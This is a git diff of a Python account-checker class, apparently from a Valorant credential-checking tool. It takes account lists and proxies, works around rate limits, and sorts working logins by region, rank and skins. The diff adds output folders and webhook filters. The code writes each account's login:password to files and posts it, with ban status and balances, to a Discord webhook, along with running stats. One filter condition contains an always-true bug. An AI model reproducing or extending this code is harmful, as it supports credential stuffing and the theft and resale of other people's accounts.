@@ -5,10 +5,9 @@ import time
 import traceback
 import keyboard
 from os.path import exists
-from threading import Thread
 import threading
-from InquirerPy import inquirer
 from InquirerPy.separator import Separator
+from datetime import datetime
 
 from colorama import Fore, Style
 
@@ -20,15 +19,43 @@ stff=staff.staff()
 
 class simplechecker():
     def __init__(self,settings:list,proxylist) -> None:
+        path = os.getcwd()
+        self.parentpath=os.path.abspath(os.path.join(path, os.pardir))
         self.proxylist=proxylist
         self.max_rlimits=settings['max_rlimits']
         self.rlimit_wait=settings['rlimit_wait']
-        self.default_reg=settings['default_region']
         self.cooldown=int(settings['cooldown'])
-        self.autosort=settings['auto_sort']
         self.webhook=settings['webhook'].replace(' ','')
         self.print_sys=bool(settings['print_sys'])
         self.esttime='99 years'
+        self.newfolder=settings['new_folder']
+        if self.newfolder=='True':
+            dtnw=str(datetime.now()).replace(' ','_').replace(':','.')
+            self.outpath=self.parentpath+f'\\output\\{dtnw}'
+            os.mkdir(self.outpath)
+        else:
+            self.outpath=self.parentpath+'\\output'
+
+        wh_settings=str(settings['dw_settings'])
+        self.send_tempban=False
+        self.send_woskins=False
+        self.send_wfshorty=False
+        self.send_stats=False
+        self.send_ukreg=False
+        #input(wh_settings)
+        if 'tempbanned accounts' in wh_settings:
+            self.send_tempban=True
+        if 'accounts without skins' in wh_settings:
+            self.send_woskins=True
+        if 'accounts with only wayfinder shorty':
+            self.send_wfshorty=True
+        if 'stats (once per minute)' in wh_settings:
+            self.send_stats=True
+        if 'accounts with unknown region' in wh_settings:
+            self.send_ukreg=True
+        #print(self.send_stats,self.send_tempban,self.send_ukreg,self.send_wfshorty,self.send_woskins)
+
+        #input()
 
         try:
             import discord_webhook
@@ -48,8 +75,6 @@ class simplechecker():
         #except ModuleNotFoundError:
         #    pass
 
-        path = os.getcwd()
-        self.parentpath=os.path.abspath(os.path.join(path, os.pardir))
         self.cpm=0
         self.startedcount=0
         self.cpmtext=self.cpm
@@ -212,32 +237,34 @@ class simplechecker():
                     time.sleep(1)
                     continue
                 else:
-                    if mailverif==True:
+                    if mailverif==True and banuntil==None:
                         self.unverifiedmail+=1
                     while True:
                         reg,lvl=sys.get_region(token)
                         reg2=sys.get_region2(token)
                         reg=reg2 if reg2 != False else reg
                         if reg!=False and reg!='' and reg != 'False':
-                            self.regions[str(reg).lower()]+=1
+                            if banuntil==None:
+                                self.regions[str(reg).lower()]+=1
                             rank=None
                             try:
-                                if int(lvl)<20:
+                                if int(lvl)<20 and banuntil==None:
                                     self.locked+=1
                                     rank='locked'
                             except ValueError:
                                 pass
                             if rank == None:
                                 rank=check.ranked(entt,token,uuid,reg).lower().split(' ')[0]
-                            try:
-                                self.ranks[rank]+=1
-                            except:
-                                self.ranks['unknown']+=1
+                            if banuntil==None:
+                                try:
+                                    self.ranks[rank]+=1
+                                except:
+                                    self.ranks['unknown']+=1
                             skins=check.skins_en(entt,token,uuid,reg)
                             vp,rp=check.balance(entt,token,uuid,reg)
                             skinscount=len(skins.split('\n'))
                             skinscount-=1
-                            if skinscount>0:
+                            if skinscount>0 and banuntil==None:
                                 self.skins+=1
                                 if skinscount>70:
                                     self.skinsam['70+']+=1
@@ -254,50 +281,19 @@ class simplechecker():
                             lastplayed=check.lastplayed(uuid,reg,token,entt)
                             break
                         else:
-                            reg=self.default_reg
-                            if lvl != 'N/A':
-                                if int(lvl)<20:
-                                    self.locked+=1
-                                    rank='locked'
-                                else:
-                                    rank=check.ranked(entt,token,uuid,reg).lower().split(' ')[0]
-                                    try:
-                                        self.ranks[rank]+=1
-                                    except:
-                                        self.ranks['unknown']+=1
-                            skins=check.skins_en(entt,token,uuid,reg)
-                            skinscount=len(skins.split('\n'))
-                            skinscount-=1
-                            if skinscount>0:
-                                self.regions[str(self.default_reg).lower()]+=1
-                                self.skins+=1
-                                if skinscount>70:
-                                    self.skinsam['70+']+=1
-                                elif skinscount>40:
-                                    self.skinsam['40-70']+=1
-                                elif skinscount>35:
-                                    self.skinsam['35-40']+=1
-                                elif skinscount>20:
-                                    self.skinsam['20-35']+=1
-                                elif skinscount>10:
-                                    self.skinsam['10-20']+=1
-                                else:
-                                    self.skinsam['1-10']+=1
-                                lastplayed=check.lastplayed(uuid,reg,token,entt)
-                                vp,rp=check.balance(entt,token,uuid,reg)
-                            else:
-                                vp,rp='N/A','N/A'
-                                lastplayed='N/A'
+                            vp,rp='N/A','N/A'
+                            lastplayed='N/A'
+                            if banuntil==None:
                                 self.ranks['unknown']+=1
                                 self.regions['unknown']+=1
-                                rank='N/A'
-                                skinscount='N/A'
-                                skins='N/A\n'
-                                reg='N/A'
-                            break
+                            rank='N/A'
+                            skinscount='N/A'
+                            skins='N/A\n'
+                            reg='N/A'
+                        break
                     if banuntil!=None:
                         self.tempbanned+=1
-                        with open (f'{self.parentpath}/output/tempbanned.txt', 'a', encoding='UTF-8') as file:
+                        with open (f'{self.outpath}/tempbanned.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''|[{account}]
 ------------------------------------  
 |ban until------> {banuntil}     
@@ -322,7 +318,7 @@ class simplechecker():
                         #    f.seek(0)
                         #    json.dump(data, f, indent=4)
                         #    f.truncate()
-                        with open (f'{self.parentpath}/output/valid.txt', 'a', encoding='UTF-8') as file:
+                        with open (f'{self.outpath}/valid.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''|[{account}]
 ------------------------------------       
 |region---------> {reg}
@@ -341,14 +337,14 @@ class simplechecker():
                     if banuntil ==None:
                         self.valid+=1
                     bantext=''
-                    if self.autosort=='True' and rank != 'N/A' and reg != 'N/A':
+                    if rank != 'N/A' and reg != 'N/A':
                         if banuntil!=None:
                             bantext=f'\n|ban until------> {banuntil}'
-                        if not exists(f'{self.parentpath}/output/regions/'):
-                            os.mkdir(f'{self.parentpath}/output/regions/')
-                        if not exists(f'{self.parentpath}/output/regions/{reg}/'):
-                            os.mkdir(f'{self.parentpath}/output/regions/{reg}/')
-                        with open(f'{self.parentpath}/output/regions/{reg}/{rank}.txt','a',encoding='UTF-8') as file:
+                        if not exists(f'{self.outpath}/regions/'):
+                            os.mkdir(f'{self.outpath}/regions/')
+                        if not exists(f'{self.outpath}/regions/{reg}/'):
+                            os.mkdir(f'{self.outpath}/regions/{reg}/')
+                        with open(f'{self.outpath}/regions/{reg}/{rank}.txt','a',encoding='UTF-8') as file:
                             file.write(f'''|[{account}]
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{bantext}        
 |region---------> {reg}
@@ -363,26 +359,41 @@ class simplechecker():
 ###account###
 
 ''')                    
-                    if self.webhook != '' and reg != 'N/A' and skins != '': #enter your requirements for sending a webhook here
-                        from discord_webhook import DiscordWebhook, DiscordEmbed
-                        dcwebhook = DiscordWebhook(url=self.webhook)
-                        embed = DiscordEmbed(title='New valid account', color='34eb43')
-                        if banuntil!=None:
-                            embed = DiscordEmbed(title='New tempbanned account', color='ff4400')
-                            embed.add_embed_field(name='Ban Until',value=str(banuntil))
-                        embed.set_author(name='valkeker')
-                        embed.set_timestamp()
-                        embed.add_embed_field(name='LogPass', value=account)
-                        embed.add_embed_field(name='Region', value=reg)
-                        embed.add_embed_field(name='Rank', value=rank)
-                        embed.add_embed_field(name='Level', value=lvl)
-                        embed.add_embed_field(name='Lastmatch', value=lastplayed)
-                        embed.add_embed_field(name='Unverifiedmail', value=mailverif)
-                        embed.add_embed_field(name=f'VP / RP', value=f'{vp} / {rp}')
-                        embed.add_embed_field(name=f'Skins ({skinscount})',value=skins)
-                        dcwebhook.add_embed(embed)
-                        response=dcwebhook.execute()
-                        #input(response)
+                    if self.webhook != '':
+                        send_wh=True
+                        if reg=='N/A' and not self.send_ukreg:
+                            send_wh=False
+
+                        if skinscount==1 and 'Wayfinder Shorty' in skins and not self.send_wfshorty:
+                            send_wh=False
+                        
+                        if banuntil != None and not self.send_tempban:
+                            send_wh=False
+                        
+                        if skinscount==0 and not self.send_woskins:
+                            send_wh=False
+                            
+                        #input(send_wh)
+                        if send_wh==True:
+                            from discord_webhook import DiscordWebhook, DiscordEmbed
+                            dcwebhook = DiscordWebhook(url=self.webhook)
+                            embed = DiscordEmbed(title='New valid account', color='34eb43')
+                            if banuntil!=None:
+                                embed = DiscordEmbed(title='New tempbanned account', color='ff4400')
+                                embed.add_embed_field(name='Ban Until',value=str(banuntil))
+                            embed.set_author(name='valkeker')
+                            embed.set_timestamp()
+                            embed.add_embed_field(name='LogPass', value=account)
+                            embed.add_embed_field(name='Region', value=reg)
+                            embed.add_embed_field(name='Rank', value=rank)
+                            embed.add_embed_field(name='Level', value=lvl)
+                            embed.add_embed_field(name='Lastmatch', value=lastplayed)
+                            embed.add_embed_field(name='Unverifiedmail', value=mailverif)
+                            embed.add_embed_field(name=f'VP / RP', value=f'{vp} / {rp}')
+                            embed.add_embed_field(name=f'Skins ({skinscount})',value=skins if skins.replace(' ','').replace('\n','')!='' else 'drugged capybaras')
+                            dcwebhook.add_embed(embed)
+                            response=dcwebhook.execute()
+                            #input(response)
 
             except Exception as e:
                 #input(e)
@@ -408,19 +419,24 @@ class simplechecker():
             self.startedcount=self.checked
             self.cpmtext = f'↑ {self.cpm}' if self.cpm>prevcpm else f'↓ {self.cpm}'
             self.esttime=sys.convert_to_preferred_format(round((self.count-self.checked)/self.cpm*60))
-        #elif finishedtesting-self.startedtesting>10000:
-        #    try:
-        #        self.rpc.update(
-        #            details=f'Checking {self.checked}/{self.count} accounts',
-        #            state=f"{self.valid} valid ({str(round(self.valid/self.checked*100 if self.checked !=0 else 0,1))}%)",
-        #            #large_image=mapImage,
-        #            #large_text=mapText,
-        #            #small_image=agent_img,
-        #            #small_text=agent,
-        #            buttons=[{"label": "What's this? 👀", "url": "https://github.com/LIL-JABA/valchecker"}]
-        #        )
-        #    except:
-        #        pass
+
+            if self.webhook != '' and self.send_stats:
+                from discord_webhook import DiscordWebhook, DiscordEmbed
+                dcwebhook = DiscordWebhook(url=self.webhook)
+                embed = DiscordEmbed(title='Stats', color='686d75')
+                embed.set_author(name='valkeker')
+                embed.set_timestamp()
+                embed.add_embed_field(name='Checked', value=f'{self.checked}/{self.count}')
+                embed.add_embed_field(name='Valid', value=self.valid)
+                embed.add_embed_field(name='Banned', value=self.banned)
+                embed.add_embed_field(name='TempBanned', value=self.tempbanned)
+                embed.add_embed_field(name='RLimits', value=self.rlimits)
+                embed.add_embed_field(name='With Skins', value=self.skins)
+                embed.add_embed_field(name='Unverifiedmail', value=self.unverifiedmail)
+                embed.add_embed_field(name='CPM', value=self.cpmtext)
+                embed.add_embed_field(name='Est. Time Remaining',value=self.esttime)
+                dcwebhook.add_embed(embed)
+                response=dcwebhook.execute()
 
         reset = Fore.RESET
         cyan = Fore.CYAN
